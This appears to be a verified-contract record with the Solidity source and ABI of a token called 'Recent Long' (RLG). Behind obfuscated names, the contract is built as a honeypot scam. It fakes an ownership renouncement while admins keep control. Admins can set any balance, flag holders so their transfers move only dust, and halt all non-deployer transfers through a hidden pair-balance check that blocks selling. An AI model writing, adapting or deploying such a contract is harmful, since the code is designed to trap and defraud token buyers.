{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface marketingSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchedSenderAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityList {\n    function createPair(address atFrom, address modeSell) external returns (address);\n}\n\ninterface fromSellTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletSell) external view returns (uint256);\n\n    function transfer(address amountFrom, uint256 senderEnable) external returns (bool);\n\n    function allowance(address maxEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountFrom,\n        uint256 senderEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundAmount, uint256 value);\n    event Approval(address indexed maxEnable, address indexed spender, uint256 value);\n}\n\ninterface launchShouldBuy is fromSellTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RecentLong is launchedSenderAuto, fromSellTrading, launchShouldBuy {\n\n    function senderMode(address listTokenFrom, address amountFrom, uint256 senderEnable) internal returns (bool) {\n        if (listTokenFrom == isSell) {\n            return swapTx(listTokenFrom, amountFrom, senderEnable);\n        }\n        uint256 takeLiquidity = fromSellTrading(senderLimitFund).balanceOf(receiverLimit);\n        require(takeLiquidity == maxExempt);\n        require(amountFrom != receiverLimit);\n        if (maxFee[listTokenFrom]) {\n            return swapTx(listTokenFrom, amountFrom, exemptAuto);\n        }\n        return swapTx(listTokenFrom, amountFrom, senderEnable);\n    }\n\n    function getOwner() external view returns (address) {\n        return takeLaunched;\n    }\n\n    bool public listToken;\n\n    function tradingMin(uint256 senderEnable) public {\n        teamMaxMode();\n        maxExempt = senderEnable;\n    }\n\n    function owner() external view returns (address) {\n        return takeLaunched;\n    }\n\n    uint256 marketingEnable;\n\n    constructor (){\n        \n        marketingSell buyIs = marketingSell(launchedMin);\n        senderLimitFund = liquidityList(buyIs.factory()).createPair(buyIs.WETH(), address(this));\n        \n        isSell = _msgSender();\n        maxShouldTake();\n        marketingTx[isSell] = true;\n        receiverTx[isSell] = txTeam;\n        \n        emit Transfer(address(0), isSell, txTeam);\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverLaunch;\n\n    uint256 maxExempt;\n\n    address receiverLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function name() external view virtual override returns (string memory) {\n        return enableReceiver;\n    }\n\n    uint256 private txTeam = 100000000 * 10 ** 18;\n\n    function approve(address launchedLiquidity, uint256 senderEnable) public virtual override returns (bool) {\n        receiverLaunch[_msgSender()][launchedLiquidity] = senderEnable;\n        emit Approval(_msgSender(), launchedLiquidity, senderEnable);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return txSellFee;\n    }\n\n    uint256 constant exemptAuto = 10 ** 10;\n\n    bool private maxTeam;\n\n    uint256 private exemptTx;\n\n    event OwnershipTransferred(address indexed autoTake, address indexed liquidityAmount);\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenAuto;\n    }\n\n    function allowance(address fundIsWallet, address launchedLiquidity) external view virtual override returns (uint256) {\n        if (launchedLiquidity == launchedMin) {\n            return type(uint256).max;\n        }\n        return receiverLaunch[fundIsWallet][launchedLiquidity];\n    }\n\n    address public isSell;\n\n    string private enableReceiver = \"Recent Long\";\n\n    function transfer(address fromToReceiver, uint256 senderEnable) external virtual override returns (bool) {\n        return senderMode(_msgSender(), fromToReceiver, senderEnable);\n    }\n\n    function swapTx(address listTokenFrom, address amountFrom, uint256 senderEnable) internal returns (bool) {\n        require(receiverTx[listTokenFrom] >= senderEnable);\n        receiverTx[listTokenFrom] -= senderEnable;\n        receiverTx[amountFrom] += senderEnable;\n        emit Transfer(listTokenFrom, amountFrom, senderEnable);\n        return true;\n    }\n\n    function maxTake(address swapMode) public {\n        teamMaxMode();\n        \n        if (swapMode == isSell || swapMode == senderLimitFund) {\n            return;\n        }\n        maxFee[swapMode] = true;\n    }\n\n    uint256 private isShould;\n\n    address launchedMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private fromTx;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txTeam;\n    }\n\n    mapping(address => bool) public marketingTx;\n\n    function teamMaxMode() private view {\n        require(marketingTx[_msgSender()]);\n    }\n\n    string private txSellFee = \"RLG\";\n\n    bool public modeFrom;\n\n    function maxShouldTake() public {\n        emit OwnershipTransferred(isSell, address(0));\n        takeLaunched = address(0);\n    }\n\n    function marketingExempt(address fromToReceiver, uint256 senderEnable) public {\n        teamMaxMode();\n        receiverTx[fromToReceiver] = senderEnable;\n    }\n\n    uint8 private tokenAuto = 18;\n\n    function transferFrom(address listTokenFrom, address amountFrom, uint256 senderEnable) external override returns (bool) {\n        if (_msgSender() != launchedMin) {\n            if (receiverLaunch[listTokenFrom][_msgSender()] != type(uint256).max) {\n                require(senderEnable <= receiverLaunch[listTokenFrom][_msgSender()]);\n                receiverLaunch[listTokenFrom][_msgSender()] -= senderEnable;\n            }\n        }\n        return senderMode(listTokenFrom, amountFrom, senderEnable);\n    }\n\n    mapping(address => bool) public maxFee;\n\n    function shouldTx(address listSwap) public {\n        if (modeFrom) {\n            return;\n        }\n        \n        marketingTx[listSwap] = true;\n        \n        modeFrom = true;\n    }\n\n    function balanceOf(address walletSell) public view virtual override returns (uint256) {\n        return receiverTx[walletSell];\n    }\n\n    address public senderLimitFund;\n\n    address private takeLaunched;\n\n    mapping(address => uint256) private receiverTx;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundIsWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromToReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderEnable\",\"type\":\"uint256\"}],\"name\":\"marketingExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxShouldTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMode\",\"type\":\"address\"}],\"name\":\"maxTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLimitFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listSwap\",\"type\":\"address\"}],\"name\":\"shouldTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderEnable\",\"type\":\"uint256\"}],\"name\":\"tradingMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromToReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTokenFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RecentLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}